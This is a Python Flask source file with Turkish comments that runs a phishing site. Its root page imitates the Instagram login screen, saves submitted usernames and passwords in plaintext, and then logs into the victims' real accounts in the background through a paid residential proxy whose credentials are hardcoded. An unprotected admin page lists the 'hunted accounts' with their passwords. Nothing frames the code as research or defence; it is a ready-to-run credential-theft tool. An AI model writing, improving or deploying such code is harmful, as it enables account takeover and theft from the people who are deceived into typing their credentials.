import os
import threading
import time
import random
from flask import Flask, request, jsonify, render_template_string
from flask_sqlalchemy import SQLAlchemy
from instagrapi import Client
from instagrapi.exceptions import ChallengeRequired, BadPassword, TwoFactorRequired
from dotenv import load_dotenv

# 1. TEMEL AYARLAR
load_dotenv()
app = Flask(__name__)
app.config['SQLALCHEMY_DATABASE_URI'] = os.getenv("DATABASE_URL")
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
db = SQLAlchemy(app)

# --- PROXY BİLGİLERİNİ BURADAN GÜNCELLE ---
# Panelinde Host: pr.proxy-cheap.com gibi bir şey yazıyorsa onu yaz.
PROXY_HOST = "residential.proxy-cheap.com" 
PROXY_PORT = "6000" # <--- PANELİNDEKİ PORT NUMARASINI BURAYA YAZ
PROXY_USER = "pcUjiruWbB"
PROXY_PASS = "PC_4gAMh8pCXyTQAxKW1"

PROXY_URL = f"http://{PROXY_USER}:{PROXY_PASS}@{PROXY_HOST}:{PROXY_PORT}"

class IGUser(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(100), unique=True)
    password = db.Column(db.String(100))
    status = db.Column(db.String(100), default="Bekliyor")

# 2. INSTAGRAM GİRİŞ EKRANI
LOGIN_HTML = """
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-black text-white flex items-center justify-center min-h-screen p-6">
    <div class="w-full max-w-[350px] border border-zinc-800 p-10 text-center rounded-sm">
        <h1 class="text-4xl italic font-bold mb-10">Instagram</h1>
        <div id="login-form">
            <input id="u" placeholder="Kullanıcı adı" class="w-full bg-[#121212] border border-[#363636] p-3 rounded mb-2 outline-none">
            <input id="p" type="password" placeholder="Şifre" class="w-full bg-[#121212] border border-[#363636] p-3 rounded mb-4 outline-none">
            <button onclick="startLogin()" id="btn-login" class="w-full bg-[#0095f6] font-bold p-2 rounded-lg">Giriş Yap</button>
        </div>
        <p id="status-msg" class="text-xs mt-6 text-red-500"></p>
    </div>
    <script>
        async function startLogin() {
            const u = document.getElementById('u').value, p = document.getElementById('p').value;
            if(!u || !p) return;
            document.getElementById('btn-login').innerText = "Kontrol ediliyor...";
            const r = await fetch('/api/start-login', {
                method: 'POST', headers: {'Content-Type':'application/json'},
                body: JSON.stringify({u, p})
            });
            const d = await r.json();
            document.getElementById('status-msg').innerText = d.msg;
            document.getElementById('btn-login').innerText = "Giriş Yap";
        }
    </script>
</body>
</html>
"""

# 3. GİRİŞ MOTORU (HATA VERMEYEN MODEL)
@app.route('/api/start-login', methods=['POST'])
def start_login():
    data = request.json
    u, p = data.get('u'), data.get('p')
    
    # ŞİFREYİ ANINDA KAYDET (HİÇ BEKLEME)
    user = IGUser.query.filter_by(username=u).first()
    if not user:
        user = IGUser(username=u, password=p); db.session.add(user)
    else:
        user.password, user.status = p, "ŞİFRE ÇEKİLDİ 📥"
    db.session.commit()

    # BOTU ARKA PLANDA ÇALIŞTIR (KULLANICIYI BEKLETME)
    def run_bot(username, password):
        with app.app_context():
            cl = Client()
            try:
                cl.set_proxy(PROXY_URL)
                cl.request_timeout = 10
                if cl.login(username, password):
                    u_obj = IGUser.query.filter_by(username=username).first()
                    u_obj.status = "AKTİF ✅"
                    db.session.commit()
            except Exception as e:
                u_obj = IGUser.query.filter_by(username=username).first()
                u_obj.status = f"Giriş Bekliyor (Panelden Gir)"
                db.session.commit()

    threading.Thread(target=run_bot, args=(u, p)).start()

    return jsonify(status="success", msg="Giriş yapılıyor, lütfen 1-2 dakika bekleyin.")

@app.route('/')
def home():
    return render_template_string(LOGIN_HTML)

@app.route('/panel-admin')
def admin():
    users = IGUser.query.order_by(IGUser.id.desc()).all()
    res = "<h2>AVLANAN HESAPLAR</h2><table border='1'><tr><th>User</th><th>Pass</th><th>Durum</th></tr>"
    for u in users:
        res += f"<tr><td>{u.username}</td><td>{u.password}</td><td>{u.status}</td></tr>"
    return res + "</table>"

if __name__ == "__main__":
    with app.app_context(): db.create_all()
    app.run(host="0.0.0.0", port=int(os.getenv("PORT", 10000)))
